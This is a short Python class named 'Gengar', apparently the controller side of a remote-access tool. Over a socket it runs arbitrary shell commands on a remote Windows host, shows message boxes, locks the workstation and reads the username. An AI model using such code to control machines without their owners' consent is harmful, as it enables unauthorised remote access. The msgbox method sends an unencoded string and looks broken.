from enum import Enum
import json
import time

import output


class CommandTypes:
    SHELL = '\x00'
    MSGBOX = '\x01'


class Gengar:
    def __init__(self, sock):
        self._sock = sock

    def shell(self, cmd):
        print(f'Running: {cmd}')
        self._sock.send((CommandTypes.SHELL + cmd).encode())
        return self._sock.recv(8192).decode().strip()

    def msgbox(self, content):
        self._sock.send(CommandTypes.MSGBOX + content)

    def lock_workstation(self):
        print('Locking workstation')
        self.shell('rundll32 user32.dll,LockWorkStation')

    def username(self):
        return self.shell('echo %username%')

    def is_alive(self):
        try:
            self.shell('test')
            return True
        except ConnectionResetError:
            return False

    def __repr__(self):
        return f'Gengar at {self.username()}'
